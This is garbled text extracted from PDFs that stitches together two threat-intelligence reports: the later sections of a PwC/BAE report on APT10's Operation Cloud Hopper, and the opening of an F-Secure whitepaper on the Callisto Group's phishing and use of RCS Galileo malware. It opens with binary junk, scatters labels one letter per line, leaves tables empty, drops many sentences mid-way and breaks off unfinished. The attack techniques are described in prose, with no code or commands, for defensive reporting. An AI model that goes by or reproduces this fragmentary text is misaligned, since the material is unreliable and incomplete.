Filename\nTranslation\n>]8t8?)mM\u00e3\n\nI\u0142MZ+\u00b6-\u00f5\u02c6\u02d9\n\n!\u02c6%hb\u00b2O\u00f0:\u00d7EE\n\n\"\u0131!IG\u00f9&\u01926_\"*\n\n5p+\u00b65 =\u00f1%\u00e3]\u00ff\n\n&\u2020%\u00e3!\u00a9\\\u00bcMZ%\u00e7 \u2018)\u201e&\u20207\u00e8L`9\u2044!\u00eb\n\n\nThe following is an example of a malicious decoy document referencing Mitsubishi Heavy Industries:\nFigure 10: Decoy document based on press \n\nHeavy Industries detailing the unveiling of \ntheir new ABLASER-DUV (Deep Ultraviolet \n\nLaser)\n 12\nA notable tactic of this APT10 subset is to register C2 domains that closely resemble legitimate Japanese organisations. Table 2 \nshows a selection of the spoofed domains registered, alongside the email addresses listed at registration and the legitimate \n\nimpersonated domains.\nTable 2: Domains observed being impersonated by APT10\nDomain\nImitating\nTheme\nDescription\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nnodes. Table 3 displaying registrant information can be seen below:\nTable 3: Known APT10 registration details showing a common name server\nDomain\nRegistrant email\nName Server\nContact Name\nContact Street\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 13\nNone of the domains share identical contact information other \nthan stating that the respective registrants are based in the \n\nUS. The contact streets, organisations, and names are all \ndistinct between domains.\nSome of the domains, that do resolve, share common IP \naddress space with the network of dynamic-DNS domains that \n\nwe associate with Operation Cloud Hopper as detailed earlier \nin the report. This connection is highlighted in the \n\ninfrastructure graph shown in Figure 11 below, where some \n\nChChes C2 domains can be seen in the bottom left, while on \nthe far right are the older APT10 domains referenced in \nprevious reporting.\nFigure 11: Infrastructure graph linking early PlugX domains to recent ChChes domains\n 14\n14\nOperation Cloud Hopper\nMotivations behind APT10\u2122s targeting\nA short history of China-based hacking\nChina-based threat actors have a long history of cyber espionage in the traditional political, military and defensive arena, as \nwell as industrial espionage for economic gain. Some of the most notable of these events from the past decade are shown below\nFigure 12: \u0152 Timeline of China-based hacking activity\n2006\n2007\n2008\n2009\n2010\n2011\n2012\n2013\n2014\n2015\n2006-13:  \nAPT1 conducted a \nwidespread cyber espionage \n\ncampaign against hundreds of \n\norganisations spanning a number of \n\nsectors. Most victims primarily \n\nconducted their business in English and \n\nhad a nexus with China\u2122s strategic \n\npriorities.\n2010:  \n\n\ndefence sectors were targeted by \n\nOperation Aurora, a campaign \n\nattributed to APT17/Aurora Panda. The \n\nlist of targets included Google, who \n\nsuffered the loss of intellectual property \n\nand attempted access to the Gmail \n\naccounts of human rights activists. \n2014: \n The data of 4.5 million \n\nmembers of US-based healthcare \n\norganisation, Community Health \n\nSystems was potentially accessed \n\nduring a breach attributed to APT18.\n2010-12:  \nBetween 2010 and \n\n2012 organisations in the energy \n\nand material manufacturing sectors \n\nwere targeted. These included \n\nWestinghouse Electric, who had technical \n\n\n\nsupports and routing stolen in 2010. \n\nAdditionally, emails of senior \n\ndecision-makers involved in the business \n\nrelationship with a Chinese state-owned \n\nenterprise were taken. In 2012, \n\nSolarWorld was compromised with \n\nattackers stealing sensitive business \n\ninformation relating to manufacturing \n\nmetrics, and production line information \n\nand costs. It is thought to have been \n\ntargeted strategically at a time when \n\nChinese manufacturers of solar products \n\nwere seeking to enter the US market at \n\nbelow fair value prices. \n2009:  \nThe Night Dragon campaign \n\ninvolved covert cyber attacks on \n\nglobal oil, energy and petrochemical \n\ncompanies and individuals in Kazakhstan, \n\nTaiwan, Greece and the US. The attackers \n\nused a number of vectors including social \n\nengineering and OS vulnerabilities to access \n\n\n\ninformation\n2009:  \nGhostNet is the alleged \nChinese group responsible for \n\nrunning a global campaign starting in \n\n2009 targeting foreign embassies and \n\nministries, NGOs, news media institutions \n\nand Tibet-related organisations. \n2013:  \nOperation Iron Tiger is an \n\nattack campaign attributed to APT31, \n\nin which US government contractors were \n\ntargeted in the areas of technology, \n\ntelecommunications, energy and \n\nmanufacturing. \n2009:  \nThree medical device \n\n\nSt. Jude Medical) were allegedly \n\ncompromised by Chinese actors. Although \n\nthe motive is unclear, patient data was not \n\nthought to be stolen, making industrial \n\nespionage the most likely intention. \n2014-15:  \nThe personal data of over \n\n20 million people was compromised \n\n\n\nManagement and attributed to China-based \n\nactors. This included Social Security \n\nnumbers as well as security clearance and \n\njob applications for government positions. \n2014-15:  \n\nwere targeted \u0152 Anthem, Premera \n\nBlue Cross and CareFirst all suffered data \n\nbreaches in 2015. These were linked \n\nto APT19.\n 15\nAPT10 alignment with previous China-based hacking\n10\n\n11\n \nhttps://www.pwccn.com/en/migration/pdf/govt-work-review-mar2016.pdf\n12\n \nhttp://www.pwccn.com/en/migration/pdf/prosperity-masses-2020.pdf\nEspionage attacks associated with China-based threat actors, \nas noted above, have traditionally targeted organisations that \n\nare of strategic value to Chinese businesses and where \nintellectual property obtained from such attacks could \nfacilitate domestic growth or advancement.\n\ndocumented the alignment between apparent information \ncollection efforts of China-based threat actors and the \nstrategic emerging industries documented in China\u2122s Five Year \n\nPlan (FYP).\n10\n The 13th FYP was released in March 2016 and \nthe sectors and organisations known to be targeted by APT10 \n\nare broadly in line with the strategic aims documented in this \nplan. These aims outlined in the FYP will largely dictate the \ngrowth of businesses in China and are, therefore, likely to also \n\nform part of Chinese companies\u2122 business strategies.\n\nChina\u2122s goal of doubling its 2010 GDP by 2020. At the \nforefront of these principles is innovation, largely focused \n\naround technological innovation, with China expected to \n\ninvest 2.5% of GDP in research and development to attain \ntechnological advances, which are anticipated to contribute \n\n11\n The areas of \ninnovation expected to receive extensive investment include, \n\nnext-generation communications, new energy, new materials, \naerospace, biological medicine and smart manufacturing.\nIn addition to the FYP principle of innovation, China is also \npromoting ten key industries in which it wants to improve \n\ninnovation in manufacturing as part of the \u201aMade in China \n2025\u2122 initiative.\n12\nObserved APT10 targeting is in line with many of the historic \ncompromises we have outlined previously as originating from \n\nChina. This targeting spans industries that align with China\u2122s \n13th FYP which would provide valuable information to \nadvance the domestic innovation goals held within China. \n\nGiven the broad spectrum of priority industries, the \n\n\n\ninformation collection. This strategy also provides additional \n\nthrough the initial compromised company\u2122s systems, creating \n\n\n\u201aMade in \nChina 2025\u2122 \nindustries\nAgricultural \nmachinery\nNext \ngeneration \ninformation \ntechnology\nNumeric \ncontrol \ntools and \nrobotics\nAerospace \nequipment\nOcean \nengineering \nequipment \nand high-tech \nships\nRailway \nequipment\nEnergy \nsaving and \nnew energy \nvehicles\nPower \nequipment\nNew \nmaterials\nMedicine \nand \nmedical \ndevices\n\n2025\u2122 initiative\n 16\nShining a light on APT10\u2122s methodology\nThis section details changes made to APT10 tools, techniques \nand procedures (TTPs) post-2014, following its shift from \n\n\nof our incident response and threat intelligence investigations \nand have been used in both of the recent campaigns we have \n\nencountered. The examples provided in this section will be \n\ndrawn from both of those campaigns.\nReconnaissance and targeting\n\n\nactor\u2122s preparation for an attack as these initial activities tend \n\nto occur below the line of visibility. Our analysis of the most \nrecently used decoy documents by APT10 in its spear phishing \ncampaigns, which is the primary delivery method of its \n\n\n\nresearch on its targets. In line with commonly used APT actor \n\nmethodologies, the threat actor aligns its decoy documents to \na topic of interest relevant to the recipient.\n\ndocument hosted on the Japan Society for the Promotion of \nScience website was weaponised and deployed as part of a \nspear phishing campaign against a Japanese target in the \n\neducation sector. \nFigure 14: Decoy document used by APT10 to target the \nJapanese education sector\nAPT10 has been known to use research from their \nreconnaissance to obtain company email addresses, and then \n\ncraft a message containing either a malicious attachment or a \nlink to a malicious site. \n1\n2\n3\n4\n5\n6\nM\nS\nP\nT\na\nr\ng\ne\nt\ne\nd\n \nM\nS\nP\nM\nS\nP\n \nc\nu\ns\nt\no\nm\ne\nr\nM\nS\nP\nT\na\nr\ng\ne\nt\ne\nd\nD\na\nt\na\nC\nu\ns\nt\no\nm\ne\nr\nu\ns\ne\nd\n \nf\no\nr\n \ne\nx\nl\nt\nr\na\nt\ni\no\nn\nA\nP\nT\n1\n0\nAPT10\ncompromises \n\nManaged IT \n\nService Providers\nMSP customers who \n\nalign to APT10\u2122s \n\n\n\naccessed by the threat \n\nactor using the MSPs \n\nlegitimate access\n\nwith stolen data are \n\nmoved from the MSP \n\ncustomer\u2122s network \n\nback onto the MSP \n\nnetwork\n\n\ndata back through \n\nMSPs  to infrastructure \n\ncontrolled by the threat \n\nactor\nData of interest to APT10 \n\nis accessed by the threat \n\nactor moving laterally \n\nthrough systems\nMSP customer data \n\ncollected by APT and \n\ncompressed, ready \n\n\n\nthe network\n 17\nAs part of the same campaign, we have also observed an email \nsent by APT10,\n13\n\nProgram, and targeting various Japanese education institutes \n\n\n14\n  and Chuo University.\n15\n The email \n\n\nfrom one of APT10\u2122s servers, the ChChes Powersploit exploit, \ndetailed in Annex B.\nInitial compromise and lateral \nmovement\nOnce on a target network, the actor rapidly deploys malware \nto establish a foothold, which may include one or more \n\nsystems that provide sustained access to a victim\u2122s network. \nAs APT10 works to gain further privileges and access, it also \nconducts internal reconnaissance, mapping out the network \n\nusing common Windows tools, and in later stages of the \n\ncompromise using open source pentesting tools, detailed in \n\nAnnex B.\nThis reconnaissance is run in parallel with the actor ensuring \nthat it has access to legitimate credentials. We have observed \n\n\nit continues to use the MSPs credentials. In order to gain any \nfurther credentials, APT10 will usually deploy credential theft \n\n\n\n\n\n\nexecuted in order to maintain this level of access. In most \ncases, these stolen MSP credentials have provided \n\nadministrator or domain administrator privileges. \nWe have observed the threat actor copying malware over to \nsystems in a compromised environment, which did not have \n13\n\n14\n\n15\n\nany outbound internet access. In one of these instances, the \nthreat actor spent more than an hour attempting to establish \n\nan outbound connection using PlugX until it realised that the \nhost had no internet access, at which point the malware and \n\n\non its targets primarily by using scheduled tasks or Windows \n\nservices in order to ensure the malware remains active \n\nregardless of system reboots.\nAPT10 heavily leverages the shared nature of client-side MSP \ninfrastructure to move laterally between MSPs and other \n\nvictims. Systems that share access and thus credentials, from \nboth a MSP and one of its clients serve as a way of hopping \nbetween the two.\nC\nl\ni\ne\nn\nt\n \ni\nn\nf\nr\na\ns\nt\nr\nu\nc\nt\nu\nr\ne\nM\nS\nP\n \ni\nn\nf\nr\na\ns\nt\nr\nu\nc\nt\nu\nr\ne\nSystems sharing credentials across the client and the \nMSP are of particular interest to APT10, and are \n\ncommonly used by the threat actor in order to gain \n\naccess to new areas of the network\n\n2009\n2017\n2016\n2014\n2013\n2009\n\n\n\n\n\n\n2014\n\n\n\n\n\n\n\n\nQ4 2014\n\n\n\n\nQ4 2016\n\n\n\n\nQ1 2017\n\n\n\n\n\n\n\n\nAugust 2013\n\n\n\n\n\n\n\n\nMarch 2014\n\n\n\n\n\n\n\n\n\n\nLegend\n\n\nSummary of APT10 activity\nFigure 15: Timeline of APT10 related activities\n 18\n\nsystems to gain network persistence and a high level of access \n\nrespectively. For example, in addition to compromising high \nvalue domain controllers and security servers, the threat actor \nhas also been observed identifying and subsequently \n\n\n\nnon-critical support functions to the business, and are thus \n\nless likely to draw the attention of system administrators.\nAs part of the long-term access to victim networks, we have \nobserved APT10 consistently install updates and new \n\n\n\nto install its malware; the actor also uses these methods to \n\npropagate across the network. \nCommunication checks are usually conducted using native \nWindows tools such as ping.exe, net.exe and tcping.exe. The \nactor will frequently \u201anet use\u2122 to several machines within \n\n\n\ndisconnecting. Further details are provided in Annex B.\nNetwork hopping and \n\nOnce APT10 have a foothold in victim networks, using either \nlegitimate MSP or local domain credentials, or their sustained \n\n\nbegin to identify systems of interest.\n\n\n\nfunctionality, to identify data of interest. This data is then \n\n\n\ntools are often launched via a remote command execution \n\nscript which is regularly named \u201at.vbs\u2122 and is a customised \nversion of an open source WMI command executor which \npipes the command output back to the operator.\nWe have observed these archives being moved outside of the \nvictim networks, either back into to the MSP environments or \nto external IP addresses in two methods, which are also \nperformed via the command line using t.vbs:\n1.\n \nMounting the target external network share with \u201anet use\u2122 \n\n\n\ntransfer the data; and,\n2.\n \nUsing the legitimate Putty Secure Copy Client (PSCP), \nsometimes named rundll32.exe, to transfer the data \n\ndirectly to the third party system.\nUsing these techniques, APT10 \u201apushes\u2122 data from victim \n\nnetworks to other networks they have access to, such as other \n\nMSP or victim networks, then, using similar methods, \u201apulls\u2122 \n\nthe data from those networks to locations from which they \n\ncan directly obtain it, such as the threat actor\u2122s C2 servers.\nAPT10\u2122s ability to bridge networks can therefore be \nsummarized as:\n\u0141\n \nUse of legitimate MSP credentials to management systems \n\nwhich bridge the MSP and multiple MSP customer \n\nnetworks;\n\u0141\n \n\n\nmanagement network and MSP customer networks;\n\u0141\n \nUse of t.vbs to execute command line tools; and,\n\u0141\n \n\nAPT10 malware\nWe classify APT10\u2122s malware into two distinct areas: tactical \n\nand sustained. The tactical malware, historically EvilGrab, \n\n\nlightweight and disposable, often being delivered through \nspear phishing. Once executed, tactical malware contains the \n\n\n\nidentify a key system of interest. The sustained malware, \n\nhistorically Poison Ivy, PlugX and now Quasar provides a more \ncomprehensive feature set. Intended to be deployed on key \nsystems, the sustained malware facilitates long-term remote \n\naccess and allows for operators to more easily carry out \n\nadministration tasks.\nSince late 2016, we have seen the threat actor develop several \n\n\nAdditionally, it has taken the open source malware, Quasar, \n\nand extended its capabilities, ensuring the incrementation of \nthe internal version number as it does so.\n\n\n\nopen-source tools. For example, PwC UK has observed APT10 \n\nand using legitimate, signed software, such as Windows \n\nDefender to load the malicious payloads.\nIn Annex B we provide detailed analysis of several of the \nthreat actor\u2122s tools as well as the common Windows tools we \nhave observed being used. \n 19\nTimeline \nFigure 17: Timeline of APT10 malware use\n16\n\n2009\n2010\n2011\n2012\n2013\n2014\n2015\n2016\n2017\nPoison Ivy\nPlugX\nEvilGrab\nChChes\n\nQuasar\nRedLeaves\nRetooling Efforts \nAlongside APT10\u2122s TTPs, we have observed a \u201aretooling\u2122 cycle. \nGiven the pace of technological change and the wide range of \n\nfreely available online tools and scripts, it is not unusual for \nan actor to re-evaluate its capabilities and to benchmark \nmultiple offerings against each other. We have observed a \n\ndecline in the deployment of some of APT10\u2122s traditional core \n\ntool set, and witnessed an increase in the development and \n\ndeployment of additional new tools which combine in-house \n\nhighly likely due to the public release of APT10 malware by \n\ncyber security vendors.\nThroughout our investigations, we have observed multiple \ndeployments of the PlugX malware from 2014 to at least 2016. \n\nThis, along with the downturn in the use of Poison Ivy, \n\n\n\nplace post 2014. Additional analysis of the infrastructure \nassociated with each distinct version of PlugX also shows an \nincrease in maturity over time. Earlier PlugX versions were \n\n\n\noriginally isolated and more obvious, whereas more recent \n\nversions have demonstrated a standardised convention for \ndomain names and IP selection. \nDuring our analysis of victim networks, we were able to \nobserve APT10 once again initiate a retooling cycle in late \n\n2016. We observed the deployment and testing of multiple \nversions of Quasar malware,\n16\n and the introduction of the \n\nWe assess it is highly likely that due to the frequent public \nrelease of information linking PlugX with China-based threat \n\nactors, continual long-term use had become unsustainable, \n\nintroducing an additional operational overhead that is easily \n\nattributable to China-based threat actors.\n 20\nConclusion\nAPT10 is a constantly evolving, highly \npersistent China-based threat actor that \nhas an ambitious and unprecedented \ncollection programme against a broad \nspectrum of sectors, enabled by its \nstrategic targeting.\nSince exposure of its operations in 2013, APT10 has made a \n\n\nits campaigns. PwC UK and BAE Systems, working closely \nwith industry and government, have uncovered a new, \nunparallelled campaign which we refer to as Operation Cloud \n\nHopper. This operation has targeted managed IT service \n\nproviders, the compromise of which provides APT10 with \n\npotential access to thousands of further victims. An additional \ncampaign has also been observed targeting Japanese entities.\nAPT10\u2122s malware toolbox shows a clear evolution from \nmalware commonly associated with China-based threat actors \ntowards bespoke in-house malware that has been used in \nmore recent campaigns; this is indicative of APT10\u2122s \n\nincreasing sophistication, which is highly likely to continue. \n\nThe threat actor\u2122s known working hours align to Chinese \n\nStandard Time (CST) and its targeting corresponds to that of \nother known China-based threat actors, which supports our \nassessment that these campaigns are conducted by APT10. \nThis campaign serves to highlight the importance of \norganisations having a comprehensive view of their threat \n\n\n\nit should also encourage organisations to fully assess the \n\nrisk posed by their third party relationships, and prompt \nthem to take appropriate steps to assure and manage these.\nA detailed technical annex supplements this main report, \nwhich provides further information about the tools and \n\ntechniques used by APT10 and contains Indicators of \nCompromise relating to all of this threat actor\u2122s known \ncampaigns. These have already been provided to the National \n\nCyber Security Centre for dissemination through their usual \n\nchannels.  \n 21\nAppendices\n 22\nAppendix A\nCollaboration between PwC UK and BAE Systems\nPwC and BAE Systems\u2122 respective Threat Intelligence teams share a mutual interest in new cyber threats. PwC and BAE \n\n\nthe most comprehensive picture possible of this threat actor\u2122s activities. Information sharing like this underpins the security \nresearch community and serves to aid remediation and inform decisions that companies make about their security needs.\nProbabilistic language\nInterpretations of probabilistic language (for example, \ufb01likely\ufb02 or \ufb01almost certainly\ufb02) vary widely, and to avoid \n\n\nhave in our assessments. Unless otherwise stated, our assessments are not based on statistical analysis.\nQualitative term\nAssociated probability range\n\n\n\n\n\n\n\n\n\n\n\n\n 23\nAppendix B\nPwC UK reporting\nPwC UK Threat Intelligence has previously published a range \nof APT10 related reporting, both in the public domain and via \n\nour subscription service. These reports are as follows:\n\u0141\n \nAPT10 resumes operations with a vengeance\n, in \nThreats Under the Spotlight \u0152 CTO-TUS-20170321-01A \n\u0141\n \nNetEaseX and the Secret Key to Lisboa\n \u0152 CTO-TIB-\n\n\n\u0141\n \nAPT10\u2122s .NET Foray\n \u0152 CTO-TIB-20170301-01B \u0152 Quasar\n\u0141\n \nAPT10 pauses for Chinese New Year\n, in Threats Under \nthe Spotlight \u0152 CTO-TUS-20170220-01A\n\u0141\n \nCVNX\u2122s sting in the tail\n \u0152 CTO-TIB-20170123-01A \u0152 \n\nChChes (Scorpion) Malware \n\u0141\n \nChina and Japan: APT to dispute \n-CTO-SIB-20170119-\n\n01A\n\u0141\n \nTaiwan Presidential Election: A Case Study on \n\nThematic Targeting,\n http://pwc.blogs.com/cyber_\nsecurity_updates/2016/03/taiwant-election-targetting.\nhtml, published 2016-03-17. Overview of EvilGrab and it \n\n\n2016 Taiwanese election\n\u0141\n \nScanbox II \n\u0152 CTO-TIB-20150223-01A \n\u0141\n \n\n Red Apollo Tearsheet\n\ufb02\nThird party reports \nA number of organisations have also published related \n\nreporting, as follows:\n\u0141\n \nRedLeaves \u0152 Malware Based on Open Source RAT\n \n\n\n\nbased-on-open-source-rat.html \u0152 Further technical \n\n\n\u0141\n \nThe relevance between the attacker group menuPass \n\nand malware (Poison Ivy, PlugX, ChChes)\n, https://\n\n\nand PlugX.\n\u0141\n \nmenuPass Returns with New Malware and New \n\nAttacks Against Japanese Academics and \n\nOrganizations,\n http://researchcenter.paloaltonetworks.\ncom/2017/02/unit42-menupass-returns-new-malware-\n\n\n\npublished 2017-02-16. APT10 attacks on Japanese \n\nacademics. Includes info on ChChes (technical), Poison Ivy \n\nand PlugX.\n\u0141\n \nChChes \u0152 Malware that Communicates with C&C \n\nServers Using Cookie Headers\n\n\n2017-02-15. Technical overview of ChChes malware with \nIOCs. \n\u0141\n \nPlugX TrendMicro \ufb01tearsheet\ufb02\n, https://www.\ntrendmicro.com/vinfo/us/threat-encyclopedia/malware/\n\nplugx, published 2016-09-07. Technical info and IOCs for \nPlugX.\n\u0141\n \nA Detailed Examination of the Siesta Campaign\n, \n\nthreat-research/2014/03/a-detailed-examination-of-the-\nsiesta-campaign.html, published 2014-03-12. Provides a \ndetailed analysis of activity dubbed the Siesta campaign.\n\u0141\n \nPOISON IVY: Assessing Damage and Extracting \n\nIntelligence\n\n\nivy.pdf, published 2013-08-21. Technical report on Poison \nIvy and campaigns that have used it, including menuPass.\n\u0141\n \nEvilGrab Malware Family Used In Targeted Attacks In \n\nAsia\n, http://blog.trendmicro.com/trendlabs-security-\nintelligence/evilgrab-malware-family-used-in-targeted-\nattacks-in-asia/, published 2013-09-18. Technical \noverview of EvilGrab.\n\u0141\n \nCrowdCasts Monthly: You Have an Adversary Problem\n, \nhttps://www.slideshare.net/CrowdStrike/crowd-casts-\n\nmonthly-you-have-an-adversary-problem, published \n2013-10-16, a presentation on Chinese actors including \nAPT, crime and hacktivist. Includes section on Stone \n\nPanda (APT10).\n\u0141\n \nPlugX: New Tool For a Not So New Campaign\n, http://\nblog.trendmicro.com/trendlabs-security-intelligence/\n\nplugx-new-tool-for-a-not-so-new-campaign/, published \n2012-09-10. Gives an introduction to PlugX.\n\u0141\n \nPulling the Plug on PlugX\n, https://www.trendmicro.\ncom/vinfo/us/threat-encyclopedia/web-attack/112/\npulling-the-plug-on-plugx, published 2012-08-04. Gives a \ntechnical overview of PlugX and what it is used for.\n About PwC\nAt PwC, our purpose is to build trust in society and solve important \n\n223,000 people who are committed to delivering quality in assurance, \n\nadvisory and tax services. \nPwC UK\u2122s cyber security team is a part of this mission, helping clients \naround the world to assess, build and manage their cyber security \n\ncapabilities and to identify and respond to incidents through a range \n\nof services including threat intelligence, threat detection and incident \nresponse.\nWe are BAE Systems\nAt BAE Systems, we provide some of the world\u2122s most advanced \ntechnology defence, aerospace and security solutions.\nAt BAE Systems Applied Intelligence, we help nations, \ngovernments and businesses around the world defend \n\nthemselves against cybercrime, reduce their risk in the \n\nconnected world, comply with regulation, and transform their \n\noperations.  We do this using our unique set of solutions, \n\nsystems, experience and processes \u0152 often collecting and \n\nanalysing huge volumes of data.\n This publication has been prepared for general guidance on matters of interest only, and does not constitute professional advice. You should not act \n\n\n\n\n\n\nacting, or refraining to act, in reliance on the information contained in this publication or for any decision based on it. \n\n\n\n ", "         \u00c5\n\u00fb\n\u00c2\n\u00d3\n\u00d1\n\u00f5\n\u00f1\n3\n\u00a5\n'\nZ\n{\n   ", "CALLISTO GROUP\nTLP: White\n SUMMARY\nThe \nCallisto Group\n is an advanced threat actor whose known targets include military personnel, \ngovernment o\u02dccials, think tanks, and journalists in Europe and the South Caucasus. Their primary interest \n\nappears to be gathering intelligence related to foreign and security policy in the Eastern Europe and South \n\nCaucasus regions.\nIn October 2015 the \nCallisto Group\n targeted a handful of individuals with phishing emails that attempted to \nobtain the target\u2122s webmail credentials.\nIn early 2016 the \nCallisto Group\n began sending highly targeted spear phishing emails with malicious \nattachments that contained, as their \u02danal payload, the \ufb01Scout\ufb02 malware tool from the HackingTeam RCS \n\nGalileo platform.\nThese spear phishing emails were crafted to appear highly convincing, including being sent from \nlegitimate email accounts suspected to have been previously compromised by the \nCallisto Group\n via \n\ncredential phishing.\nThe \nCallisto Group\n has been active at least since late 2015 and continues to be so, including continuing to \nset up new phishing infrastructure every week.\nCONTENTS\nSummary\n .............................................\n2\nIntelligence\n ...........................................\n3\nIntroduction\n \n...........................................\n3\nAttack overview \n \n.......................................\n3\nPhase 1: credential phishing\n \n............................\n3\nPhase 2: spear phishing with malicious attachments\n \n.......\n3\nMalware usage\n \n.......................................\n4\nConsequences\n \n.......................................\n5\nTargeting and attribution\n \n................................\n5\nContinuing activity\n \n.....................................\n5\nIdenti\u02dacation, mitigation, and remediation\n ...............\n6\nIdentifying Callisto Group activity\n \n.......................\n6\nMitigation against credential phishing\n \n...................\n6\nRemediation against credential phishing\n \n................\n6\nMitigation against spear phishing and RCS Galileo\n \n........\n6\nRemediation against RCS Galileo\n \n........................\n6\nAppendix A | Indicators of Compromise\n ..............\n7\nF-SECURE LABS \n \nTHREAT INTELLIGENCE \nMalware analysis \n \n\nWhitepaper\nPublished: April 2017\n 3\nINTELLIGENCE\nINTRODUCTION\nThe \nCallisto Group\n is an advanced threat actor that, as far as we know, has never \nbeen identi\u02dced\n.\n The primary focus of the \nCallisto Group\n appears to be intelligence \n\ngathering related to European foreign and security policy\n.\nThis report focuses on describing activity dating from late 2015 to the present day \n\nthat we have been able to de\u02dcnitively associate with the \nCallisto Group\n.\n Also, some \n\nindications of loosely linked activity dating back to at least 2013 is provided in the \n\nsection \ufb01Related activity\ufb02 (page 3)\n.\n However, we do not currently attribute this older \n\nactivity directly to the \nCallisto Group\n.\nATTACK OVERVIEW \nPHASE 1: CREDENTIAL PHISHING\nIn October 2015, the \nCallisto Group\n was observed sending targeted credential \n\nphishing emails with the subject \ufb01Remove account [target\u2122s Gmail address]\ufb02\n.\n These \nemails purported to come from Google alerting the target that their Gmail account \n\nwas about to be removed\n.\n The emails requested the target to click a link to prevent \n\ntheir account from being removed\n.\n If clicked, this link would lead to a phishing \n\nwebsite that attempts to harvest the target\u2122s Gmail credentials\n.\nThe emails were designed to appear authentic and convincing\n.\n The domains used \nGoogle or commonly known Google services in both the referenced links and the \n\nsender\u2122s email\n.\n \nBased on our information, these emails were highly targeted and were only sent to \na handful of targets\n.\n At least some of the recipient Gmail addresses were personal \n\naccounts of the target and not readily available to the public, suggesting thorough \n\nreconnaissance by the attackers\n.\nKnown targets include European military personnel\n.\n We also have reason to believe \nthis or related phishing incidents targeted key personnel in European think tanks\n.\nPHASE 2: SPEAR PHISHING WITH MALICIOUS ATTACHMENTS\nIn early 2016, the \nCallisto Group\n was observed sending targeted spear phishing \n\nemails containing malicious attachments\n.\n These emails were sent from email \n\naccounts of individuals likely to be familiar to the recipient\n.\n We believe these email \naccounts were compromised in the previous phase of the attack, or in similar \n\nrelated phishing attacks\n.\nKnown spear phishing emails made reference to a conference with relevance to \nEuropean security policy\n.\n The malicious attachments purported to be invitations \nor drafts of the agenda for the conference\n.\n The compromised email accounts used \nto send the spear phishing emails belonged to individuals involved in organizing \n\nthe conference\n.\n Combining this information together resulted in highly convincing \nspear phishing\n.\nKnown targets of these spear phishing emails with malicious attachments include \nmilitary personnel, government o\u02dacials, think tanks, and journalists in Europe and \n\nthe South Caucasus\n.\n We are currently not aware of any evidence suggesting any of \n\nthese individuals were compromised, just that they were targeted\n.\nAll known malicious attachments sent with these spear phishing emails were \nMicrosoft Word \n.\ndocx \u02dcles\n.\n None of the known \u02dcles exploited any vulnerabilities\n.\n \nRather, the \u02dcles utilize a feature of Microsoft Word that allows \ufb01objects\ufb02 to be \n\nembedded in docx \u02dcles\n.\n In the case of these malicious \u02dcles, the embedded object is \n\nthe malware executable\n.\n 4\nFor the embedded malware to be executed, a user needs to click an icon in the \ndocx \u02dcle (see Images 1 and 2 for examples)\n.\n Additionally, in recent versions of \n\nMicrosoft Word, if a user clicks the icon for the embedded executable, Word will \n\nprompt the user with a warning (see Image 3)\n.\n The payload will only be executed \n\nif the user acknowledges the prompt\n.\nMALWARE USAGE\nIn all known malicious attachments, the \u02dcnal payload was a variant of the \ufb01Scout\ufb02 \n\ntool from the HackingTeam Remote Control System (RCS) Galileo hacking \n\nplatform\n.\n HackingTeam is an Italian software company that created RCS, which \n\nthey describe as \ufb01the hacking suite for governmental interception\ufb02\n.\n1\n In July 2015, \nnews emerged that HackingTeam had been breached\n.\n One of the consequences \n\nof this incident was the then latest version of RCS Galileo being leaked to the \n\npublic\n.\n2 \nAs a result of the leak, both the source code and the ready-made installers for \n\nthe RCS platform were made available for anyone to use\n.\n Based on our analysis \nof \nCallisto Group\n\u2122s usage of RCS Galileo, we believe the \nCallisto Group\n did not \n\nutilize the leaked RCS Galileo source code, but rather used the leaked ready-\n\nmade installers to set up their own installation of the RCS Galileo platform\n.\n The \n\nprocess for using the leaked installers to set up an RCS Galileo installation has \n\nbeen described online in publicly available blogposts, making the process trivial \n\nto achieve\n.\nIn the known spear phishing attacks by the \nCallisto Group\n, they employed the \n\n\ufb01Scout\ufb02 malware tool from the RCS Galileo platform\n.\n The \ufb01Scout\ufb02 malware tool is \n\na light backdoor intended to be used as an initial reconnaissance tool to gather \n\nbasic system information and screenshots from a compromised computer, as \n\nwell as enable the installation of additional malware\n.\nIMAGE 3\n \nWarning prompt shown to the user by recent versions of Microsoft Word \nif the user clicks the icon for the embedded malware executable\n.\n \n \nThe malware will only be executed if the user clicks \ufb01OK\ufb02\n.\nIMAGE 2\n \nIcon for an embedded malware \n \nexecutable in another malicious attachment\nIMAGE 1\n \nIcon for an embedded malware \n \nexecutable in a malicious attachment\n1\n. \nHackingTeam;  \n \nhttp://www\n.\nhackingteam\n.\nit/\n2\n. \nArstechnica; \nHacking Team gets \nhacked; invoices suggest spyware \nsold to repressive govts\n; published 7 \nJul 2015;\n \n\nhttp://arstechnica\n.\ncom/\nsecurity/2015/07/hacking-team-gets-\n\nhacked-invoices-show-spyware-sold-\nto-repressive-govts/\n 5\nCONSEQUENCES\nIf a target of the credential phishing described in \ufb01Phase 1: credential phishing\ufb02 clicked a link in the \nemail and proceeded to input their email credentials on the resulting phishing website, this would \n\nprovide the \nCallisto Group\n with the target\u2122s email credentials\n.\n Unless the target was using two-\n\nfactor-authentication, the \nCallisto Group\n would then have full access to the target\u2122s email account\n.\nWe are con\u02dcdent the \nCallisto Group\n used this type of access to a target\u2122s email account for the \n\npurposes of sending spear phishing to other targets\n.\n We also believe it is highly likely that the \n\nCallisto Group\n would leverage the same access to read and monitor the target\u2122s email activity\n.\nIf a target of the spear phishing described in \ufb01Phase 2: malware deployment\ufb02 opened the email \n\nattachment and, crucially, clicked on the icon in the attachment, this would lead to the target\u2122s \n\ncomputer becoming infected with the \ufb01Scout\ufb02 malware tool from the RCS Galileo platform\n.\n This \n\nmalware tool would have gathered basic information on the target\u2122s computer and delivered these \n\nto the \nCallisto Group\n.\n This malware tool would have also enabled the \nCallisto Group\n to install \n\nadditional malware on the target\u2122s computer\n.\n \nIn e\u02dbect, this would have provided the \nCallisto Group\n with full remote access to the target\u2122s \n\ncomputer, and by extension, to any data accessible to the target via their computer\n.\nTARGETING AND ATTRIBUTION\nThe most obvious common theme between all known targets of the \nCallisto Group\n is an \n\ninvolvement in European foreign and security policy, whether as a military or government o\u02dacial, \n\nbeing employed by a think tank, or working as a 